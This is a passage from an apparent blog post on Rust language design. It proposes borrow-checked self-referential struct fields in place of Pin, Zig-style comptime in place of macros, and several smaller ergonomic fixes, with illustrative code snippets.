</ul>

<p>While a variable is borrowed (<code>y = &amp;x</code>), you can't move, mutate or drop the variable. In this example, <code>x</code> is put into a special "borrowed" state throughout the lifetime of <code>y</code>. Variables in the "borrowed" state are pinned, immutable, and have a bunch of other constraints. This "borrowed state" is visible to the compiler, but its completely invisible to the programmer. You can't tell that something is borrowed until you try to compile your program. (Aside: I wish Rust IDEs made this state visible while programming!)</p>

<p>But at least this program <em>works</em>.</p>

<p>Unfortunately, there's no equivalent to this for structs. Lets turn the function <code>async</code>:</p>

<pre><code>async fn foo() {  
    let x = vec![1,2,3];
    let y = &amp;x;

    some_future().await;

    dbg!(y);
}
</code></pre>

<p>When you compile this, the compiler creates a hidden struct for you, which stores the suspended state of this function. It looks something like this:</p>

<pre><code>struct FooFuture {  
  x: Vec&lt;usize&gt;,
  y: &amp;'_ Vec&lt;usize&gt;,
}

impl Future for FooFuture { ... }  
</code></pre>

<p><code>x</code> is borrowed by <code>y</code>. So it needs to be placed under all the constraints of a borrowed variable:</p>

<ul>
<li>It must not move in memory. (It needs to be Pinned)</li>
<li>It must be immutable</li>
<li>We can't take mutable references to <code>x</code> (because of the &amp; xor &amp;mut rule).</li>
<li><code>x</code> must outlive <code>y</code>.</li>
</ul>

<p>But there's no syntax for this. Rust doesn't have syntax to mark a struct field as being in a borrowed state. And we can't express the lifetime of <code>y</code>.</p>

<p>Remember: the rust compiler already generates and uses structs like this whenever you use <code>async</code> functions. The compiler just doesn't provide any way to write code like this ourselves. Lets just extend the borrow checker and fix that!</p>

<p>I don't know what the ideal syntax would be, but I'm sure we can come up with something. For example, maybe <code>y</code> gets declared as a "local borrow", written as <code>y: &amp;'Self::x Vec&lt;usize&gt;</code>. The compiler uses that annotation to figure out that <code>x</code> is borrowed. And it puts it under the same set of constraints as a borrowed variable inside a function.</p>

<p>This would also let you work with self-referential structs, like an <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract Syntax Tree (AST)</a> in a compiler:</p>

<pre><code>struct Ast {  
  source: String,
  ast_nodes: Vec&lt;&amp;'Self::source str&gt;,
}
</code></pre>

<p>This syntax could also be adapted to support partial borrows:</p>

<pre><code>impl Foo {  
  fn get_some_field&lt;'a&gt;(&amp;'a self) -&gt; &amp;'a::some_field usize {
    &amp;self.some_field
  }
}
</code></pre>

<p>This isn't a complete solution.</p>

<p>We'd also need a <code>Move</code> marker trait, to replace <code>Pin</code>. Any struct with borrowed fields can't be Moved - so it wouldn't have <code>impl Move</code>. I'd also consider a <code>Mover</code> trait, which would allow structs to intelligently move themselves in memory. Eg:</p>

<pre><code>trait Mover {  
  // Something like that.
  unsafe fn move(from: *Self, to: MaybeUninit&lt;&amp;mut Self&gt;);
}
</code></pre>

<p>We'd also need a sane, safe way to construct structs like this in the first place. I'm sure we can do better than <code>MaybeUninit</code>.</p>

<p>Miguel Young de la Sota <a href="https://www.youtube.com/watch?v=UrDhMWISR3w">gave a fantastic talk a few years ago</a> talking about <code>Move</code> in rust. But I think it would be much more "rusty" to lean on the borrow checker instead.</p>

<p>If you ask me, <code>Pin</code> is a dead end solution. Rust already has a borrow checker. Lets use it for structs.</p>

<h3 id="comptime">Comptime</h3>

<p>This is a hot opinion. I haven't spent a lot of time with zig, but at least from a distance I adore <a href="https://zig.guide/language-basics/comptime/">comptime</a>.</p>

<p>In the rust compiler we essentially implement two languages: Rust and the Rust Macro language. (Well, arguably there's 3 - because proc macros). The Rust programming language is lovely. But the rust macro languages are horrible.</p>

<p>But, if you already know rust, why not just use rust itself instead of sticking another language in there? This is the genius behind Zig's <code>comptime</code>. The compiler gets a little interpreter tacked on that can run parts of your code at compile time. Functions, parameters, if statements and loops can all be marked as compile-time code. Any non-comptime code in your block is emitted into the program itself.</p>

<p>I'm not going to explain the feature in full here. Instead, take in just how <em>gorgeous</em> this makes Zig's <a href="https://ziglang.org/documentation/master/#Case-Study-print-in-Zig">std <code>print</code> function</a>.</p>

<p>Its entirely implemented using comptime. So when you write this in zig:</p>

<pre><code>pub fn main() void {  
    print("here is a string: '{s}' here is a number: {}\n", .{ a_string, a_number });
}
</code></pre>

<p><code>print</code> takes the format string as a comptime parameter, and parses it within a <code>comptime</code> loop. Aside from a couple keywords, the function is just regular zig code - familiar to anyone who knows the language. It just gets executed within the compiler. And the result? It emits this beauty:</p>

<pre><code>pub fn print(self: *Writer, arg0: []const u8, arg1: i32) !void {  
    try self.write("here is a string: '");
    try self.printValue(arg0);
    try self.write("' here is a number: ");
    try self.printValue(arg1);
    try self.write("\n");
    try self.flush();
}
</code></pre>

<p>Read the <a href="https://ziglang.org/documentation/master/#Case-Study-print-in-Zig">full case study</a> for more details.</p>

<p>In comparison, I tried to look up how rust's <code>println!()</code> macro is implemented. But <a href="https://doc.rust-lang.org/src/std/macros.rs.html#138-145">println! calls some secret <code>format_args_nl</code> function</a>. I assume that function is hardcoded in the rust compiler itself.</p>

<p>Its not a great look when even the rust compiler authors don't want to use rust's macro language.</p>

<h3 id="weirdlittlefixes">Weird little fixes</h3>

<p>Bonus round time. Here's some other little "nits" I'd love to fix while we're at it:</p>

<ul>
<li><code>impl&lt;T: Copy&gt; for Range&lt;T&gt;</code>. If you know, you know.</li>
<li>Fix <a href="https://github.com/rust-lang/rust/issues/26925">derive with associated types</a>. <a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2021&amp;gist=6fd2c813f411f6eb1abb66a473425c89">Full example here</a>.</li>
<li>Make if-let expressions support logical AND. Its so simple, so obvious, and so useful. This should work:</li>
</ul>

<pre><code>// Compile error! We can't have nice things.
if let Some(x) = some_var &amp;&amp; some_expr { }  
</code></pre>

<p>You can sort of work around this problem today as below, but its awkward to write, hard to read and the semantics are different from how normal <code>if</code> statements work because it lacks short-circuit evaluation.</p>

<pre><code>// check_foo() will run even if some_var is None.
if let (Some(x), true) = (some_var, check_foo()) { ... }  
</code></pre>

<p><a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2021&amp;gist=e4c4521e6a0ab49462c0b9d55da97480">Full example here</a>.</p>

<p>Rust's ergonomics for raw pointers are also uniquely horrible. When I work with unsafe code, my code should be as easy to read &amp; write as humanly possible. But the rust compiler seems intent on punishing me for my sins. For example, if I have a reference to a struct in rust, I can write <code>myref.x</code>. But if I have a pointer, rust insists that I write <code>(*myptr).x</code> or, worse: <code>(*(*myptr).p).y</code>. Horrible. Horrible and entirely counterproductive. Unsafe code should be clear.</p>

<p>I'd also change all the built in collection types to take an <code>Allocator</code> as a constructor argument. I personally don't like Rust's decision to use a global allocator. Explicit is better than implicit.</p>

<h2 id="closingthoughts">Closing thoughts</h2>

<p>Thats all the ideas I have. I mean, async needs some love too. But there's so much to say on the topic that async deserves a post of its own.</p>

<p>Unfortunately, most of these changes would be incompatible with existing rust. Even adding security capabilities would require a new rust edition, since it introduces a new way that crates can break semver compatibility.</p>

<p>A few years ago I would have considered writing RFCs for all of these proposals. But I like programming more than I like dying slowly in the endless pit of github RFC comments. I don't want months of work to result in yet another idea in <a href="https://doc.rust-lang.org/reference/items/associated-items.html">rust's landfill of unrealised dreams</a>.</p>

<p>Maybe I should fork the compiler and do it myself. Urgh. So many projects. If I could live a million lifetimes, I'd devote one to working on compilers.</p>
